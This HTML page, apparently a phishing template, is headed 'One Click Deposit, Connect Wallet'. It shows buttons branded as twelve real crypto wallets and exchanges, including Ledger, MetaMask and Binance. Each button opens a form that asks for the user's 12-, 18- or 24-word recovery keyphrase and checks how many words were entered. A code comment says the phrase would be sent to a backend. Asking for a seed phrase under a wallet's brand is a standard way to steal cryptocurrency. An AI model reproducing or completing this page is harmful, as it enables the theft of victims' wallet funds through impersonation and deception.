<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Click Deposit, Connect Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #1a1a1a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .container {
            max-width: 1200px;
            width: 100%;
        }

        .header {
            text-align: center;
            margin-bottom: 60px;
        }

        .header h1 {
            font-size: 3rem;
            font-weight: 300;
            color: #ffffff;
            letter-spacing: -1px;
        }

        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }

        .wallet-card {
            background: #2a2a2a;
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            position: relative;
            overflow: hidden;
        }

        .wallet-card:hover {
            background: #333333;
            border-color: #4a90e2;
            transform: translateY(-2px);
        }

        .wallet-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, rgba(74, 144, 226, 0.1), rgba(74, 144, 226, 0.05));
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .wallet-card:hover::before {
            opacity: 1;
        }

        .wallet-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            background: #4a4a4a;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 1;
            overflow: hidden;
        }

        .wallet-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 12px;
        }

        .wallet-name {
            font-size: 1.1rem;
            font-weight: 500;
            color: #ffffff;
            position: relative;
            z-index: 1;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: #2a2a2a;
            margin: 15% auto;
            padding: 40px;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            position: relative;
            border: 1px solid #444;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            position: absolute;
            top: 20px;
            right: 30px;
        }

        .close:hover,
        .close:focus {
            color: #fff;
        }

        .modal-header {
            color: #4a90e2;
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 30px;
            text-align: center;
        }

        .modal-body {
            text-align: center;
        }

        .keyphrase-info {
            color: #aaa;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .keyphrase-label {
            color: #ccc;
            font-size: 0.9rem;
            margin-bottom: 15px;
            text-align: left;
        }

        .keyphrase-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #444;
            border-radius: 10px;
            background: #1a1a1a;
            color: #fff;
            font-size: 1rem;
            margin-bottom: 30px;
            transition: border-color 0.3s ease;
        }

        .keyphrase-input:focus {
            outline: none;
            border-color: #4a90e2;
        }

        .keyphrase-input::placeholder {
            color: #666;
        }

        .submit-btn {
            background: #4a90e2;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }

        .submit-btn:hover {
            background: #357abd;
            transform: translateY(-1px);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2rem;
            }

            .wallet-grid {
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
            }

            .wallet-card {
                padding: 20px;
            }

            .modal-content {
                margin: 10% auto;
                padding: 30px 20px;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 1.5rem;
            }

            .wallet-grid {
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            }

            .wallet-card {
                padding: 15px;
            }

            .wallet-icon {
                width: 50px;
                height: 50px;
                font-size: 20px;
            }

            .wallet-name {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>One Click Deposit, Connect Wallet</h1>
        </div>

        <div class="wallet-grid">
            <div class="wallet-card" onclick="openModal('Ledger')">
                <div class="wallet-icon">
                    <img src="ledger-icon.png" alt="Ledger">
                </div>
                <div class="wallet-name">Ledger</div>
            </div>

            <div class="wallet-card" onclick="openModal('Trust Wallet')">
                <div class="wallet-icon">
                    <img src="trust-wallet-icon.png" alt="Trust Wallet">
                </div>
                <div class="wallet-name">Trust Wallet</div>
            </div>

            <div class="wallet-card" onclick="openModal('MetaMask')">
                <div class="wallet-icon">
                    <img src="metamask-icon.png" alt="MetaMask">
                </div>
                <div class="wallet-name">MetaMask</div>
            </div>

            <div class="wallet-card" onclick="openModal('Bybit')">
                <div class="wallet-icon">
                    <img src="bybit-icon.png" alt="Bybit">
                </div>
                <div class="wallet-name">Bybit</div>
            </div>

            <div class="wallet-card" onclick="openModal('Binance')">
                <div class="wallet-icon">
                    <img src="binance-icon.png" alt="Binance">
                </div>
                <div class="wallet-name">Binance</div>
            </div>

            <div class="wallet-card" onclick="openModal('Coinbase')">
                <div class="wallet-icon">
                    <img src="coinbase-icon.png" alt="Coinbase">
                </div>
                <div class="wallet-name">Coinbase</div>
            </div>

            <div class="wallet-card" onclick="openModal('Bitget')">
                <div class="wallet-icon">
                    <img src="bitget-icon.png" alt="Bitget">
                </div>
                <div class="wallet-name">Bitget</div>
            </div>

            <div class="wallet-card" onclick="openModal('Coin 96')">
                <div class="wallet-icon">
                    <img src="coin96-icon.png" alt="Coin 96">
                </div>
                <div class="wallet-name">Coin 96</div>
            </div>

            <div class="wallet-card" onclick="openModal('SafePal')">
                <div class="wallet-icon">
                    <img src="safepal-icon.png" alt="SafePal">
                </div>
                <div class="wallet-name">SafePal</div>
            </div>

            <div class="wallet-card" onclick="openModal('Zelcore')">
                <div class="wallet-icon">
                    <img src="zelcore-icon.png" alt="Zelcore">
                </div>
                <div class="wallet-name">Zelcore</div>
            </div>

            <div class="wallet-card" onclick="openModal('Walletic')">
                <div class="wallet-icon">
                    <img src="walletic-icon.png" alt="Walletic">
                </div>
                <div class="wallet-name">Walletic</div>
            </div>

            <div class="wallet-card" onclick="openModal('TronLink')">
                <div class="wallet-icon">
                    <img src="tronlink-icon.png" alt="TronLink">
                </div>
                <div class="wallet-name">TronLink</div>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div id="walletModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div class="modal-header" id="modalTitle">Ledger Keyphrase</div>
            <div class="modal-body">
                <div class="keyphrase-info">Supported keyphrase Length: 12, 18, or 24 words</div>
                <div class="keyphrase-label">Enter Keyphrase</div>
                <input type="text" class="keyphrase-input" placeholder="Enter 12, 18, or 24 words keyphrase" id="keyphraseInput">
                <button class="submit-btn" onclick="submitKeyphrase()">Submit</button>
            </div>
        </div>
    </div>

    <script>
        function openModal(walletName) {
            const modal = document.getElementById('walletModal');
            const modalTitle = document.getElementById('modalTitle');
            const keyphraseInput = document.getElementById('keyphraseInput');
            
            modalTitle.textContent = walletName + ' Keyphrase';
            keyphraseInput.value = '';
            modal.style.display = 'block';
        }

        function closeModal() {
            const modal = document.getElementById('walletModal');
            modal.style.display = 'none';
        }

        function submitKeyphrase() {
            const keyphrase = document.getElementById('keyphraseInput').value.trim();
            
            if (!keyphrase) {
                alert('Please enter your keyphrase');
                return;
            }

            const wordCount = keyphrase.split(' ').length;
            if (wordCount !== 12 && wordCount !== 18 && wordCount !== 24) {
                alert('Please enter a valid keyphrase with 12, 18, or 24 words');
                return;
            }

            // Here you would typically send the keyphrase to your backend
            alert('Keyphrase submitted: ' + keyphrase);
            closeModal();
        }

        // Close modal when clicking outside of it
        window.onclick = function(event) {
            const modal = document.getElementById('walletModal');
            if (event.target === modal) {
                closeModal();
            }
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });
    </script>
</body>
</html>
